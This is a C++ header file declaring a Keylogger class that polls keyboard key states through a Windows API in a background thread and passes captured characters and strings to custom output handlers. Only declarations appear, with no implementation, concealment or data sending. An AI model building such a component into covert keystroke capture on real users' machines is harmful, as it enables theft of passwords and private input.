#pragma once
#include <iostream>
#include "keyboard.h"

class Keylogger {
	private:
	//The Keyboard class that initialized this Keylogger class
	Keyboard* keyboard;
	//The thread running the main keylog loop
	std::thread* keylog;

	//Updates all Keyboard Keys with the Microsoft API
	void setKeysState();
	//Shows parameter to output stream
	template<typename T> static void showOutput(T output);

	public:
	//Initializes automatically with the Keyboard class initialization
	Keylogger(Keyboard* keyboard);

	//Starts the keylogging loop thread 
	void startKeylog();
	//Returns whether the keylog thread is running
	bool isKeylogging() const;
	//Stops the keylogging loop thread
	void stopKeylog();

	//Retrieves meaningful information from the Keyboard Keys state and handles them
	void getOutput();
	//Custom output handler
	static void handleOutput(char output);
	//Custom output handler
	static void handleOutput(std::string output);
};